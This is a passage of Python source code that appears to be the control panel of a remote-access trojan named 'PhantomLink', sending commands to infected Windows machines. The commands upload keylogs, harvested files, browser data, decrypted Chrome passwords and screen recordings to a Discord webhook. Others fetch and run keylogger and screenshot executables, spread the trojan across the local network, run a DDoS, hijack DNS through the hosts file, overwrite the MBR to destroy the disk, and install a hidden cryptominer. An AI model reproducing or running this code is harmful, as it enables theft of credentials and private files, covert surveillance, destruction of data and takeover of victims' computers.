            response = ctx.cm._recv_message(ctx.conn)
        if response:
            print(response.decode('utf-8', errors='ignore'))
            ctx.logger(f"Unblocked {link2}.{endlink} on [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
            ctx.client['command_in_progress'] = False

        command4 = 'ipconfig /flushdns'
        with ctx.client['lock']:
            if not ctx.cm._send_message(ctx.conn, f"CMD:{command4}"):
                ctx.client['command_in_progress'] = False
                return "break"
            response = ctx.cm._recv_message(ctx.conn)
        if response:
            print(response.decode('utf-8', errors='ignore'))
            ctx.logger(f"{response.decode('utf-8', errors='ignore')}")
    else:
        print("Invalid input")

def _cmd_play(ctx: CmdContext) -> Optional[str]:
    path = input("FULL path of audio file: ")
    command2 = f'powershell -Command "Start-Process $env:USERPROFILE\\ffmpeg\\bin\\ffplay.exe -ArgumentList \'-nodisp -autoexit \\"{path}\\"\' -NoNewWindow -Wait"'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"Played Audio {path} silently\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_port(ctx: CmdContext) -> Optional[str]:
    port = input("Port: ")
    command2 = f'netsh advfirewall firewall add rule name="PhantomLink{port}" dir=in action=allow protocol=TCP localport={port}'
    with ctx.client['lock']:
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"Port: {port} opened on [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")

    command3 = 'ipconfig /flushdns'
    with ctx.client['lock']:
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command3}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"{response.decode('utf-8', errors='ignore')}")

def _cmd_kill(ctx: CmdContext) -> Optional[str]:
    sure = input("Are you sure? (y/n): ")
    if sure.lower().strip() == 'y':
        command2 = 'taskkill /f /im svchost.exe'
        ctx.logger(f"Killing PC!")
        with ctx.client['lock']:
            if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
                ctx.client['command_in_progress'] = False
                return "break"
            response = ctx.cm._recv_message(ctx.conn)
        if response:
            print(response.decode('utf-8', errors='ignore'))
            ctx.logger(f"[{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
        print("Killing . . .")
    else:
        return "continue"

def _cmd_wallpaper(ctx: CmdContext) -> Optional[str]:
    path = input("FULL path to image: ")
    command2 = fr'reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "{path}" /f && RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"Changed Wallpaper for [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_rotate(ctx: CmdContext) -> Optional[str]:
    direction = input("up / down / left / right  : ").lower().strip()
    orient_map = {'up': 0, 'right': 1, 'down': 2, 'left': 3}
    if direction in orient_map:
        orient_code = orient_map[direction]
        command2 = (
            'powershell -NoProfile -Command "'
            'Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices; [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)] public struct DEVMODE { [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)] public string dmDeviceName; public short dmSpecVersion; public short dmDriverVersion; public short dmSize; public short dmDriverExtra; public int dmFields; public int dmOrientation; } public class Display { [DllImport(\\"user32.dll\\", CharSet = CharSet.Auto)] public static extern int EnumDisplaySettings(string lpszDeviceName, int iModeNum, ref DEVMODE lpDevMode); [DllImport(\\"user32.dll\\", CharSet = CharSet.Auto)] public static extern int ChangeDisplaySettingsEx(string lpszDeviceName, ref DEVMODE lpDevMode, IntPtr hwnd, uint dwflags, IntPtr lParam); public static void Rotate(int orientation) { DEVMODE dm = new DEVMODE(); dm.dmSize = (short)Marshal.SizeOf(dm); if (EnumDisplaySettings(null, -1, ref dm) != 0) { dm.dmOrientation = orientation; ChangeDisplaySettingsEx(null, ref dm, IntPtr.Zero, 1, IntPtr.Zero); } } }\'; '
            f'[Display]::Rotate({orient_code})"'
        )
    else:
        print("Invalid input\n")
        return "continue"

    with ctx.client['lock']:
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))

def _cmd_sleep(ctx: CmdContext) -> Optional[str]:
    command2 = r'rundll32.exe powrprof.dll,SetSuspendState 0,1,0'
    with ctx.client['lock']:
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"PC [{ctx.username}] slept\n\n{response.decode('utf-8', errors='ignore')}")

def _cmd_keylog(ctx: CmdContext) -> Optional[str]:
    command2 = f'curl -F "file=@%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\keylog.txt" -F "content=Keylog" {DISCORD_WEBHOOK}'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        ctx.logger(f'Keylog file of user [{ctx.username}]:')
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"KeyLog file of [{ctx.username}] sent\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_keylogger(ctx: CmdContext) -> Optional[str]:
    command2 = f'curl -O http://{SERVER_IP}/keylogger.exe && start /B "" "keylogger.exe"'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"KeyLogger injected on [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_screener(ctx: CmdContext) -> Optional[str]:
    command3 = f'taskkill /im screener.exe /f & del /f /q "%APPDATA%\\MicrosoftUpdate\\screener.exe" & curl -O http://{SERVER_IP}/screenshoter.exe && start /B "" "screenshoter.exe"'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command3}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"Auto Screenshoter injected on [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_update(ctx: CmdContext) -> Optional[str]:
    updating = input('Update PhantomLink? (y/n):  ')
    if updating.lower().strip() == 'y':
        ctx.logger(f"{'='*10}\nUpdating PhantomLink . . .\n{'='*10}")
        command2 = f'curl -O http://{SERVER_IP}/PhantomLink.exe && start /B "" "PhantomLink.exe"'
        with ctx.client['lock']:
            ctx.client['command_in_progress'] = True
            if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
                ctx.client['command_in_progress'] = False
                return "break"
            response = ctx.cm._recv_message(ctx.conn)
        if response:
            print(response.decode('utf-8', errors='ignore'))
            ctx.logger(f"PhantomLink Updating on {ctx.username}\n\n Status:\n{response.decode('utf-8', errors='ignore')}")
            ctx.client['command_in_progress'] = False
    else:
        return "continue"

def _cmd_harvest(ctx: CmdContext) -> Optional[str]:
    extension = input("Extension (pdf/docx/txt): ")
    command2 = f'''powershell -Command "Get-ChildItem -Path C:\\Users -Include *.{extension} -Recurse -ErrorAction SilentlyContinue | Select-Object -First 20 | ForEach-Object {{ curl -F \\"file=@$($_.FullName)\\" -F \\"content=Harvested File\\" {DISCORD_WEBHOOK} }}"'''
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        ctx.logger(f'Files of [{ctx.username}]:')
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"got files from [{ctx.username}] extension ({extension})\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_browser(ctx: CmdContext) -> Optional[str]:
    command2 = 'powershell -NoProfile -Command "$dest = \\"$env:TEMP\\chrome_data\\"; if (Test-Path $dest) { Remove-Item $dest -Recurse -Force }; New-Item -ItemType Directory -Path $dest -Force | Out-Null; Copy-Item \\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\*\\" -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue; Compress-Archive -Path \\"$dest\\*\\" -DestinationPath \\"$env:TEMP\\chrome.zip\\" -Force"'
    command4 = f'powershell -NoProfile -Command "if (Test-Path \'$env:TEMP\\chrome.zip\') {{ curl -F \\"file=@$env:TEMP\\chrome.zip\\" -F \\"content=Chrome Data [{ctx.username}]\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] chrome.zip not found.\' }}"'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
    with ctx.client['lock']:
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command4}"):
            ctx.client['command_in_progress'] = False
            return "break"
        ctx.logger(f'Browser data for [{ctx.username}]:')
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"Sent all Browser saved data for [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_screenrec(ctx: CmdContext) -> Optional[str]:
    duration = input("Duration (seconds): ")
    command2 = f'powershell -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg.exe\' }} elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'C:\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) {{ (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source }} elseif (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) {{ (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName }} else {{ $null }}; if ($ff) {{ Start-Process $ff -ArgumentList \'-f gdigrab -framerate 5 -i desktop -t {duration} -vcodec libx264 -preset ultrafast $env:USERPROFILE\\screen.mp4\' -NoNewWindow -Wait }} else {{ Write-Error \'[!] ffmpeg.exe not found. Please run ffmpeg setup first.\' }}"'
    command3 = f'powershell -Command "if (Test-Path \'$env:USERPROFILE\\screen.mp4\') {{ curl -F \\"file=@$env:USERPROFILE\\screen.mp4\\" -F \\"content=Screen Recording\\" {DISCORD_WEBHOOK} }} else {{ Write-Error \'[!] screen.mp4 not found.\' }}"'
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.client['command_in_progress'] = False
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command3}"):
            ctx.client['command_in_progress'] = False
            return "break"
        ctx.logger(f'Screen rec of [{ctx.username}]')
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"Screen recorded for {duration}S\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_worm(ctx: CmdContext) -> Optional[str]:
    command2 = '''powershell -Command "
                $subnet = '192.168.1';
                1..254 | ForEach-Object {
                    $ip = \\"$subnet.$_\\";
                    if(Test-Connection $ip -Count 1 -Quiet) {
                        try {
                            $cred = New-Object System.Management.Automation.PSCredential('Administrator', (ConvertTo-SecureString 'admin' -AsPlainText -Force));

                            Copy-Item "$env:APPDATA\\MicrosoftUpdate\\defender.exe" \\\\\\\\$ip\\\\C$\\\\Windows\\\\Temp\\\\update.exe;

                            Invoke-WmiMethod -ComputerName $ip -Credential $cred -Class Win32_Process -Name Create -ArgumentList 'C:\\\\Windows\\\\Temp\\\\update.exe';
                        } catch {}
                    }
                }"'''
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"Injecting PhantomLink to all PCs on network of [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False
def _cmd_ddos(ctx: CmdContext) -> Optional[str]:
    target = input("Target IP/URL: ")
    duration = input("Duration (seconds): ")

    command2 = f'''powershell -Command "
                $end = (Get-Date).AddSeconds({duration});
                while((Get-Date) -lt $end) {{
                    try {{
                        Invoke-WebRequest -Uri '{target}' -Method GET -TimeoutSec 1;
                    }} catch {{}}
                }}"'''

    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"Doing DDOS on [{target}] to {duration}S from [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False
def _cmd_dnshijack(ctx: CmdContext) -> Optional[str]:
    domain = input("Domain to hijack (e.g. facebook.com): ")
    redirect_ip = input("Redirect to IP: ")

    command2 = f'''echo {redirect_ip} {domain} >> %WINDIR%\\System32\\drivers\\etc\\hosts && echo {redirect_ip} www.{domain} >> %WINDIR%\\System32\\drivers\\etc\\hosts && ipconfig /flushdns'''
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"DNS {domain} hijacked to {redirect_ip} on [{ctx.username}]\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_mouse(ctx: CmdContext) -> Optional[str]:
    action = input("move/click/scroll: ")
    command2 = None

    if action == 'move':
        x = input("X coordinate: ")
        y = input("Y coordinate: ")
        command2 = f'''powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point({x},{y})"'''

    elif action == 'click':
        command2 = r'''powershell -Command "
        $sig = '[DllImport(\\"user32.dll\\")]public static extern void mouse_event(int flags,int dx,int dy,int cButtons,int info);';
        $type = Add-Type -MemberDefinition $sig -Name Mouse -PassThru;
        $type::mouse_event(0x02,0,0,0,0);
        $type::mouse_event(0x04,0,0,0,0);
        "'''

    elif action == 'scroll':
        direction = input("up/down: ")
        amount = input("Amount: ")
        delta = amount if direction == 'up' else f'-{amount}'
        command2 = f'''powershell -Command "$sig='[DllImport(\\"user32.dll\\")]public static extern void mouse_event(int,int,int,int,int);';$t=Add-Type -MemberDefinition $sig -Name M -PassThru;$t::mouse_event(0x800,0,0,{delta},0)"'''

    if command2:
        with ctx.client['lock']:
            ctx.client['command_in_progress'] = True
            if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
                ctx.client['command_in_progress'] = False
                return "break"
            response = ctx.cm._recv_message(ctx.conn)
        if response:
            print(response.decode('utf-8', errors='ignore'))
            ctx.logger(f"Controlled mouse on [{ctx.username}]:\n{action}\n\n{response.decode('utf-8', errors='ignore')}")
            ctx.client['command_in_progress'] = False
    else:
        print('Undefined')

def _cmd_type(ctx: CmdContext) -> Optional[str]:
    text = input("Text to type: ")

    # Escape special characters
    text_escaped = text.replace("'", "''").replace('"', '`"')

    command2 = f'''powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('{text_escaped}')"'''
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"Injected Keyboard key on [{ctx.username}]:\n{text}\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False

def _cmd_killmbr(ctx: CmdContext) -> Optional[str]:
    confirm = input("THIS WILL BRICK THE PC! Type 'DESTROY' to confirm: ")
    if confirm == 'DESTROY':
        command2 = r'''powershell -Command "
                    $mbr = New-Object byte[] 512;
                    (New-Object Random).NextBytes($mbr);
                    $disk = [System.IO.File]::Open('\\\\.\\PhysicalDrive0', 'Open', 'Write');
                    $disk.Write($mbr, 0, 512);
                    $disk.Close();
                    "'''
        ctx.logger(f"\n{'='*20}[!] PC [{ctx.username}] DESTROYED [!]\n{'='*20}")
        with ctx.client['lock']:
            if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
                ctx.client['command_in_progress'] = False
                return "break"
            response = ctx.cm._recv_message(ctx.conn)
        if response:
            print(response.decode('utf-8', errors='ignore'))

    else:
        return "continue"
def _cmd_rootkit(ctx: CmdContext) -> Optional[str]:
    action = input("Action (hide/unhide): ").lower()

    if action == 'hide':
        command2 = '''
            powershell -Command "
            $proc = Get-Process -Id $PID
            $proc.PriorityClass = 'Idle'

            $code = @'
            [DllImport(\\"kernel32.dll\\")]
            public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

            [DllImport(\\"kernel32.dll\\")]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

            [DllImport(\\"kernel32.dll\\")]
            public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, int flAllocationType, int flProtect);

            [DllImport(\\"kernel32.dll\\")]
            public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
            '@

            Add-Type -MemberDefinition $code -Name 'Rootkit' -Namespace 'Win32'

            $explorer = Get-Process -Name explorer | Select -First 1

            $hProcess = [Win32.Rootkit]::OpenProcess(0x1F0FFF, $false, $explorer.Id)

            Write-Output 'Process hidden in explorer.exe'
            "
            '''

    elif action == 'unhide':
        command2 = 'powershell -Command "Stop-Process -Name python -Force; Write-Output \'Unhidden\'"'

    else:
        print(f"[!] Invalid action: {action}. Use 'hide' or 'unhide'")
        return "continue"

    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)

    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"[ROOTKIT] {action} [{ctx.username}]: {response.decode('utf-8', errors='ignore')}")
    ctx.client['command_in_progress'] = False
def _cmd_mine(ctx: CmdContext) -> Optional[str]:
    action = input("Action (start/stop/status): ").lower()

    if action == 'start':
        wallet = input("Your Monero wallet address: ")
        threads = input("CPU threads to use (default 2): ") or "2"

        command2 = f'''
            $minerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-msvc-win64.zip"
            $minerZip = "$env:TEMP\\miner.zip"
            $minerDir = "$env:APPDATA\\MicrosoftUpdate\\miner"

            Invoke-WebRequest -Uri $minerUrl -OutFile $minerZip

            Expand-Archive -Path $minerZip -DestinationPath $minerDir -Force
            Remove-Item $minerZip

            $config = @{{
                "autosave" = $true
                "cpu" = @{{
                    "enabled" = $true
                    "max-threads-hint" = {threads}
                }}
                "pools" = @(
                    @{{
                        "url" = "pool.supportxmr.com:443"
                        "user" = "{wallet}"
                        "pass" = "x"
                        "tls" = $true
                    }}
                )
            }} | ConvertTo-Json -Depth 10

            $config | Out-File "$minerDir\\config.json" -Encoding UTF8

            Start-Process "$minerDir\\xmrig.exe" -ArgumentList "--config=$minerDir\\config.json" -WindowStyle Hidden

            Write-Output "Mining started with {threads} threads"
            '''

    elif action == 'stop':
        command2 = 'Stop-Process -Name xmrig -Force; Write-Output "Mining stopped"'

    elif action == 'status':
        command2 = '''
            $miner = Get-Process -Name xmrig -ErrorAction SilentlyContinue
            if ($miner) {
                $cpu = [math]::Round($miner.CPU, 2)
                Write-Output "Mining active - CPU: $cpu%"
            } else {
                Write-Output "Mining not running"
            }
            '''

    else:
        print(f"[!] Invalid action: {action}. Use 'start', 'stop', or 'status'")
        return "continue"

    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)

    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"[MINER] {action} on [{ctx.username}]: {response.decode('utf-8', errors='ignore')}")
    ctx.client['command_in_progress'] = False
def _cmd_print(ctx: CmdContext) -> Optional[str]:
    message = input("Message to print: ")
    copies = input("Number of copies (default 1): ") or "1"

    command2 = f'''
            powershell -Command "
            # Create text file
            $text = @'
            {'=' * 60}
                       PHANTOMLINK
            {'=' * 60}

            {message}

            {'=' * 60}
            '@

            $textPath = '$env:TEMP\\print.txt'
            $text | Out-File -FilePath $textPath -Encoding UTF8

            Get-Printer | ForEach-Object {{
                try {{
                    for ($i = 0; $i -lt {copies}; $i++) {{
                        Start-Process -FilePath $textPath -Verb Print -Wait
                    }}
                    Write-Output \\"Printed to: $($_.Name)\\"
                }} catch {{
                    Write-Output \\"Failed: $($_.Name)\\"
                }}
            }}

            Remove-Item $textPath -Force
            "
            '''

    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)

    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(f"[PRINTER] Printed {copies} copies: {message} on [{ctx.username}]")
        ctx.client['command_in_progress'] = False
def _cmd_spam(ctx: CmdContext) -> Optional[str]:
    count = input("Number of popups: ")
    message = input("Message: ")

    command2 = f'''powershell -Command "
                            Add-Type -AssemblyName Microsoft.VisualBasic;
                            for($i=0; $i -lt {count}; $i++) {{
                                [Microsoft.VisualBasic.Interaction]::MsgBox('{message}', 'OKOnly,SystemModal,Critical', 'ERROR');
                                Start-Sleep -Milliseconds 100;
                            }}"'''
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(
            f"Spammed [{ctx.username}]:\n{message} {count} times\n\n {response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False
def _cmd_sniff(ctx: CmdContext) -> Optional[str]:
    duration = input("Capture for X seconds: ")

    command2 = f'''powershell -Command "
                            $adapter = Get-NetAdapter | Where {{ $_.Status -eq 'Up' }} | Select -First 1;
                            netsh trace start capture=yes tracefile=$env:TEMP\\capture.etl maxsize=100 filemode=single overwrite=yes;
                            Start-Sleep {duration};
                            netsh trace stop;
                            curl -F \\"file=@$env:TEMP\\capture.etl\\" -F \\"content=Network Capture\\" {DISCORD_WEBHOOK};
                            Remove-Item $env:TEMP\\capture.etl;
                            "'''
    with ctx.client['lock']:
        ctx.client['command_in_progress'] = True
        if not ctx.cm._send_message(ctx.conn, f"CMD:{command2}"):
            ctx.client['command_in_progress'] = False
            return "break"
        response = ctx.cm._recv_message(ctx.conn)
    if response:
        print(response.decode('utf-8', errors='ignore'))
        ctx.logger(
            f"Sniffed network traffic on [{ctx.username}] for {duration}S\n\n{response.decode('utf-8', errors='ignore')}")
        ctx.client['command_in_progress'] = False
def _cmd_chrome_pass(ctx: CmdContext) -> Optional[str]:
    script = '''
            import os,json,base64,sqlite3,shutil
            from Crypto.Cipher import AES
            from win32crypt import CryptUnprotectData

            def get_key():
                path=os.path.join(os.environ["USERPROFILE"],"AppData","Local","Google","Chrome","User Data","Local State")
                with open(path,"r") as f:
                    local_state=json.load(f)
                encrypted_key=base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                return CryptUnprotectData(encrypted_key,None,None,None,0)[1]

            def decrypt_pass(enc_pass,key):
                try:
                    if enc_pass[:3]==b'v10':
                        nonce=enc_pass[3:15]
                        cipher=AES.new(key,AES.MODE_GCM,nonce)
                        return cipher.decrypt(enc_pass[15:])[:-16].decode()
                    return CryptUnprotectData(enc_pass,None,None,None,0)[1].decode()
                except Exception:
                    return "[ERROR]"

            db_path=os.path.join(os.environ["USERPROFILE"],"AppData","Local","Google","Chrome","User Data","Default","Login Data")
            temp_db=os.path.join(os.environ["TEMP"],"ld")
            shutil.copy2(db_path,temp_db)
            conn=sqlite3.connect(temp_db)
            cursor=conn.cursor()
            key=get_key()
            cursor.execute("SELECT origin_url,username_value,password_value FROM logins")
            output=""
            for row in cursor.fetchall():
                pwd=decrypt_pass(row[2],key)
                if row[1] or pwd:
                    output+=f"URL: {row[0]}\\nUser: {row[1]}\\nPass: {pwd}\\n{'='*50}\\n"
            cursor.close()
            conn.close()
            os.remove(temp_db)
            print(output)
            '''

    #Save script to temp file
    command1 = f'echo {base64.b64encode(script.encode()).decode()} > %TEMP%\\cp.b64'
    command2 = 'certutil -decode %TEMP%\\cp.b64 %TEMP%\\chrome_pass.py'

    command3 = 'pip install pycryptodome pywin32 --break-system-packages'

    #Run script
    command4 = 'python %TEMP%\\chrome_pass.py > %TEMP%\\chrome_passwords.txt'

    #Send results
    command5 = f'curl -F "file=@%TEMP%\\chrome_passwords.txt" -F "content=Chrome Passwords" {DISCORD_WEBHOOK}'

    #Execute all commands in sequence
    for cmd_exec in [command1, command2, command3, command4, command5]:
        with ctx.client['lock']:
            ctx.client['command_in_progress'] = True
            if not ctx.cm._send_message(ctx.conn, f"CMD:{cmd_exec}"):
                ctx.client['command_in_progress'] = False
                return "break"
            response = ctx.cm._recv_message(ctx.conn)
        if response:
            print(response.decode('utf-8', errors='ignore'))
            ctx.client['command_in_progress'] = False

    ctx.logger(f"Chrome passwords extracted from [{ctx.username}]")
def _cmd_fakeupdate(ctx: CmdContext) -> Optional[str]:
    update_type = input("Update type (windows/chrome/office): ").lower()
    duration = input("Duration in minutes (default 10): ") or "10"
    if update_type == 'windows':
        html_content = '''<!DOCTYPE html><html><head><title>Windows Update</title><style>body{background:#0078d7;color:white;font-family:"Segoe UI",sans-serif;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;margin:0}.spinner{border:8px solid rgba(255,255,255,0.3);border-top:8px solid white;border-radius:50%;width:80px;height:80px;animation:spin 1s linear infinite;margin-bottom:40px}keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}h1{font-size:48px;margin:20px 0}p{font-size:24px;margin:10px 0}.progress{width:400px;height:4px;background:rgba(255,255,255,0.3);margin-top:20px}.progress-bar{height:100%;background:white;width:0%;animation:progress 600s linear forwards}keyframes progress{to{width:100%}}</style></head><body><div class="spinner"></div><h1>Working on updates</h1><p id="percent">0% complete</p><p>Do not turn off your PC. This will take a while.</p><div class="progress"><div class="progress-bar"></div></div><script>let percent=0;setInterval(()=>{percent+=Math.random()*0.5;if(percent>99)percent=99;document.getElementById("percent").textContent=Math.floor(percent)+"% complete"},3000)</script></body></html>'''
    elif update_type == 'chrome':
